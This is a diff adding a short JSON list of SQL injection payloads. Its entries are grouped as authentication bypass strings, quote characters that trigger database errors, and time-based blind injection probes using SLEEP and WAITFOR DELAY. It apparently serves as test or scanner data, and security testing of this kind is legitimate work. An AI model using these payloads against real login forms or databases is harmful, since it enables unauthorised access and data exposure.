@@ -1,0 +1,19 @@
+{
+  "auth_bypass": [
+    "' OR '1'='1",
+    "' OR 1=1 --",
+    "admin' --",
+    "admin' #",
+    "' OR 'a'='a"
+  ],
+  "error_triggering": [
+    "'",
+    "\"",
+    "\\",
+    "';--"
+  ],
+  "time_based": [
+    "1' AND SLEEP(5)--",
+    "'; WAITFOR DELAY '0:0:5'--"
+  ]
+}
